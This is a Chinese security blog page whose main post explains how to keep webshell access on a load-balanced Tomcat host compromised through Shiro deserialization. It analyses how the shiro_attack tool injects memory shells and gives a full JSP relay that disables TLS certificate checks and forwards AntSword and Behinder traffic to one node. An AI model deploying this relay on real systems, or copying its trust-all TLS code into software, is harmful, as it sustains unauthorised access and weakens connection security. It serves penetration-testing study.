<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/" class="post-title-link" itemprop="url">负载均衡踩坑记</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-09-24 10:55:46" itemprop="dateCreated datePublished" datetime="2021-09-24T10:55:46+08:00">2021-09-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-28 19:23:28" itemprop="dateModified" datetime="2021-09-28T19:23:28+08:00">2021-09-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index">
                    <span itemprop="name">安全研究</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​    事情是这样的，最近有个渗透的小伙伴找我，它通过shiro反序列化植入内存马获取了一个shell，但这台主机上有负载均衡，所以通过冰蝎、蚁剑等连接工具上传大文件会上传失败，需要我这边提供解决方案。</p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="问题一：为什么shell管理工具文件上传需要分包？"><a href="#问题一：为什么shell管理工具文件上传需要分包？" class="headerlink" title="问题一：为什么shell管理工具文件上传需要分包？"></a>问题一：为什么shell管理工具文件上传需要分包？</h3><p>​    我使用蚁剑做了测试，蚁剑配置shell可以在<code>其他设置</code>中设置分片的大小，默认是<code>500kb</code>，那有小伙伴可能要说了，那我将这个值改成一个比较大的值不就可以一次性上传大文件也就相当于解决了负载均衡的问题。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924111448792.png" alt="image-20210924111448792"></p>
<p>​    理论上是没错的，我们改分包的大小为<code>5000kb</code>试试，提示<strong>上传失败！</strong></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924111602702.png" alt="image-20210924111602702"></p>
<p>​    抓包可以看到确实发起了上传请求但是并<strong>没有获取到返回结果</strong>，并且我们可以看到上传的内容都是在<code>z2</code>参数中，那么<strong>会不会是请求参数有大小限制导致的？</strong></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924111529941.png" alt="image-20210924111529941"></p>
<p>​    经过查阅资料，<strong>Tomcat默认参数大小为2M</strong>，所以才需要对上传操作分包上传。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924112151502.png" alt="image-20210924112151502"></p>
<h3 id="问题二：是否有其他方式上传大文件？"><a href="#问题二：是否有其他方式上传大文件？" class="headerlink" title="问题二：是否有其他方式上传大文件？"></a>问题二：是否有其他方式上传大文件？</h3><p>​    虽然webshell管理工具没有提供一次上传大文件的方式，但实际上我们也<strong>可以自己构造一个上传点通过解析上传表单的内容实现一次性上传大文件的需求</strong>。虽然这种方案也算比较可行，可以解决目前的需求，但是并没有从本质上解决负载均衡下的webshell连接问题。</p>
<h3 id="问题三：有什么方法可以解决负载均衡下的webshell连接问题？"><a href="#问题三：有什么方法可以解决负载均衡下的webshell连接问题？" class="headerlink" title="问题三：有什么方法可以解决负载均衡下的webshell连接问题？"></a>问题三：有什么方法可以解决负载均衡下的webshell连接问题？</h3><p>​    其实在很早以前<code>Medicean</code>表哥就分析过这个问题，可以参考<a href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA" target="_blank" rel="noopener">负载均衡下的 WebShell 连接</a>。</p>
<p>​    在这片文章中他提出了一个比较稳妥的解决方案，即<strong>实现HTTP代理，将所有对webshell的连接请求都代理到指定的一台节点上处理，我们只需要和代理交互即可</strong>。</p>
<p>​    虽然<code>Medicean</code>表哥提出了解决方案，不过并没有给出具体的实现代码，所以我们只能自己去写，不过这个逻辑本身也比较简单，<strong>请求代理url时构建一个新的url请求并发送到指定节点，最后获取返回结果并返回给客户端</strong>。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>​    这里我开了两台web进行模拟。</p>
<ul>
<li>tomcat <strong>模拟负载均衡</strong>的主机，这台主机上有一个webshell（<code>http://192.168.3.1:8088/test666.jsp</code>）。</li>
<li>使用springboot启动的web <strong>模拟代理</strong>的功能（主要是为了方便调试），需要将所有对webshell的请求转发到tomcat中处理并获取返回结果(<code>http://192.168.3.1:8089</code>)。</li>
</ul>
<h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><p>​    首先是URL请求的问题，由于我们并不知道对方主机上是否有其他的第三方库处理HTTP请求，所以选择使用JDK自带的<code>HttpsURLConnection</code>来处理URL请求。可以分为下面几个步骤实现代理功能。</p>
<h3 id="步骤一：接收请求内容并发给目标"><a href="#步骤一：接收请求内容并发给目标" class="headerlink" title="步骤一：接收请求内容并发给目标"></a>步骤一：接收请求内容并发给目标</h3><p>​    在获取请求内容时，我们的代理并不关注目标发送了什么数据，所以我这里决定使用<code>request.getInputStream</code>获取请求内容。但是这里有个小坑点，由于我是使用springboot来模拟<code>proxy</code>的，但<strong>springboot在到达我们的proxy Controller之前会读取InputStream中的内容，所以在proxy Controller中去读<code>request.getInputStream</code>是获取不到内容的</strong>。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924121239642.png" alt="image-20210924121239642"></p>
<p>​    由于渗透小伙伴给的目标本身不解析JSP，我最终一定是要打一个内存马给他的，所以我这干脆找了个<a href="https://github.com/bitterzzZZ/MemoryShellLearn/blob/main/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-servlet-filter-listener/AddFilter.java" target="_blank" rel="noopener">Filter的内存马</a>，在<code>doFilter</code>中添加我们代理的逻辑。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924121830705.png" alt="image-20210924121830705"></p>
<h3 id="步骤二：获取目标返回结果并返回给客户端"><a href="#步骤二：获取目标返回结果并返回给客户端" class="headerlink" title="步骤二：获取目标返回结果并返回给客户端"></a>步骤二：获取目标返回结果并返回给客户端</h3><p>​        在获取返回包时，还有一个小坑，蚁剑的返回包是字符，所以我们直接用字符流获取返回内容并输出是没问题的，但是冰蝎的返回包却是字节码，用字符流处理会有问题，因此最终还是用<code>OutputStream</code>获取响应。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924134436463.png" alt="image-20210924134436463"></p>
<h3 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h3><p>​    下面是<strong>蚁剑</strong>的测试，<code>proxy2</code>是我注入的内存马的URL：</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924135009915.png" alt="image-20210924135009915"></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924135425629.png" alt="image-20210924135425629"></p>
<p><strong>冰蝎演示</strong></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924140513691-16324635138441.png" alt="image-20210924140513691"></p>
<h3 id="内存马种植问题"><a href="#内存马种植问题" class="headerlink" title="内存马种植问题"></a>内存马种植问题</h3><p>​    在本地调试通过后因为要把代理打到内存中，所以我在本地搭建了shiro测试。但是当我通过shiro植入内存马却爆了请求头过长的问题。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924141225088.png" alt="image-20210924141225088"></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924141459811.png" alt="image-20210924141459811"></p>
<p>​    但我用<a href="https://github.com/j1anFen/shiro_attack" target="_blank" rel="noopener">GITHUB</a>上这款工具注入内存马却没有问题，抓包分析下它的内存马种植除了有remeberMe字段，还POST一个dy参数。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924141838161.png" alt="image-20210924141838161"></p>
<p>​    那我们分析下这款工具是如何注入内存马的。</p>
<p>​    当我们执行内存马植入操作，主要会交给<code>attack.core.AttackService#injectMem</code>处理请求。<code>GadgetPayload</code>生成加密后的Remeberme的值，将这个值设置到Cookie中，并且植入内存马的密码和路径都会被设置到请求头中。接下来通过<code>MemBytes.getBytes</code>获取要注入的内存马的类的Base64后的字节码并设置到dy字段中。所以在<code>dy</code>参数中保存的才是真正的内存马。<code>Cookie</code>中保存的只是加载内存马的Loader。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924143925125.png" alt="image-20210924143925125"></p>
<p>​    分析过CC的同学一定知道，<code>TemplatesImpl</code>中最终会将<code>_bytecodes</code>中的类实例化，所以到服务端会执行<code>InjectMemTool</code>的构造方法。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145443578.png" alt="image-20210924145443578"></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145511067.png" alt="image-20210924145511067"></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145652571.png" alt="image-20210924145652571"></p>
<p>​    <code>InjectMemTool</code>构造方法中通过反射获取<code>request</code>对象的<code>dy</code>参数，Base64解码后通过defineClass加载类，最终实例化后调用<code>equal</code>方法。这里作者还是下了一些功夫的，为了压缩这个类的体积，将反射获取字段内容抽出来构造了<code>getFV</code>方法。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924145956729.png" alt="image-20210924145956729"></p>
<p>​    在作者提供的内存马中，<code>equals</code>方法会去通过<code>addFilter</code>或者<code>addServlet</code>添加内存马。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924150313488.png" alt="image-20210924150313488"></p>
<p>​    虽然了解了原理，但是自己手改这样的代码其实还是比较复杂的，所以我决定将作者提供的内存马的实现类的<code>doFilter</code>方法改成我们的代理类的内容，所以要分析<code>MemBytes.getBytes</code>的逻辑。<code>getBytes</code>根据传入的类型找到<code>classname</code>，再根据<code>classname</code>从<code>MEM_TOOLS</code>中找到实现类的字节码。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924162342542.png" alt="image-20210924162342542"></p>
<p>​    这个字节码在初始化时就会被放入Map中，所以理论上来讲，只要我们在Map里添加代理和实现类的Base64编码就可以扩展这个功能了。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924162537239.png" alt="image-20210924162537239"></p>
<p>​        理论上是这样没错，可是我将Proxy添加到map中，编译后覆盖掉原有的类后发现我的<code>ProxyFilter</code>并没有在界面上显示。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924173104339.png" alt="image-20210924173104339"></p>
<p>​    分析源码后发现这些值是写死的，所以不能通过这种方式扩展，只能通过将原有的<code>Filter</code>覆盖为我们的Proxy的方式来实现。可惜作者没有在GITHUB开源，而开不太方便。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924173231587.png" alt="image-20210924173231587"></p>
<h3 id="SSL问题"><a href="#SSL问题" class="headerlink" title="SSL问题"></a>SSL问题</h3><p>​    本以为到这里就结束了，但目标是开启了SSL的tomcat,而这个SSL可能是使用的自签名，所以直接去请求会报错，我本地也给tomcat开启了SSL进行访问测试，发现会爆一个SSL的异常，所以这里我们还要加上一个判断，忽略SSL的验证。</p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924173914351.png" alt="image-20210924173914351"></p>
<p><img src="/2021/09/24/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%B8%A9%E5%9D%91%E8%AE%B0/image-20210924174036647.png" alt="image-20210924174036647"></p>
<h3 id="完整实现"><a href="#完整实现" class="headerlink" title="完整实现"></a>完整实现</h3><p>​    最后给出完整实现的JSP版本。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.net.ssl.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.ByteArrayOutputStream"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.DataInputStream"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.InputStream"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.OutputStream"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.HttpURLConnection"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URL"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.security.KeyManagementException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.security.NoSuchAlgorithmException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.security.cert.CertificateException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.security.cert.X509Certificate"</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ignoreSsl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HostnameVerifier hv = <span class="keyword">new</span> HostnameVerifier() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verify</span><span class="params">(String urlHostName, SSLSession session)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        trustAllHttpsCertificates();</span><br><span class="line">        HttpsURLConnection.setDefaultHostnameVerifier(hv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trustAllHttpsCertificates</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TrustManager[] trustAllCerts = <span class="keyword">new</span> TrustManager[] &#123; <span class="keyword">new</span> X509TrustManager() &#123;</span><br><span class="line">            <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkClientTrusted</span><span class="params">(X509Certificate[] arg0, String arg1)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line">                <span class="comment">// Not implemented</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkServerTrusted</span><span class="params">(X509Certificate[] arg0, String arg1)</span> <span class="keyword">throws</span> CertificateException </span>&#123;</span><br><span class="line">                <span class="comment">// Not implemented</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            SSLContext sc = SSLContext.getInstance(<span class="string">"TLS"</span>);</span><br><span class="line"></span><br><span class="line">            sc.init(<span class="keyword">null</span>, trustAllCerts, <span class="keyword">new</span> java.security.SecureRandom());</span><br><span class="line"></span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeyManagementException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">        String target = <span class="string">"https://127.0.0.1:8443/test666.jsp"</span>;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(target);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"https"</span>.equalsIgnoreCase(url.getProtocol())) &#123;</span><br><span class="line">            ignoreSsl();</span><br><span class="line">        &#125;</span><br><span class="line">        HttpURLConnection conn = (HttpURLConnection)url.openConnection();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        conn.setRequestMethod(request.getMethod());</span><br><span class="line">        conn.setConnectTimeout(<span class="number">30000</span>);</span><br><span class="line">        conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">        conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">        conn.setInstanceFollowRedirects(<span class="keyword">false</span>);</span><br><span class="line">        conn.connect();</span><br><span class="line">        ByteArrayOutputStream baos=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        OutputStream out2 = conn.getOutputStream();</span><br><span class="line">        DataInputStream in=<span class="keyword">new</span> DataInputStream(request.getInputStream());</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        baos.flush();</span><br><span class="line">        baos.writeTo(out2);</span><br><span class="line">        baos.close();</span><br><span class="line">        InputStream inputStream = conn.getInputStream();</span><br><span class="line">        OutputStream out3=response.getOutputStream();</span><br><span class="line">        <span class="keyword">int</span> len2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len2 = inputStream.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            out3.write(buf, <span class="number">0</span>, len2);</span><br><span class="line">        &#125;</span><br><span class="line">        out3.flush();</span><br><span class="line">        out3.close();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA" target="_blank" rel="noopener">负载均衡下的 WebShell 连接</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/10/Dubbo%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Dubbo源码分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-09-10 13:50:49" itemprop="dateCreated datePublished" datetime="2021-09-10T13:50:49+08:00">2021-09-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-09-15 14:03:49" itemprop="dateModified" datetime="2021-09-15T14:03:49+08:00">2021-09-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
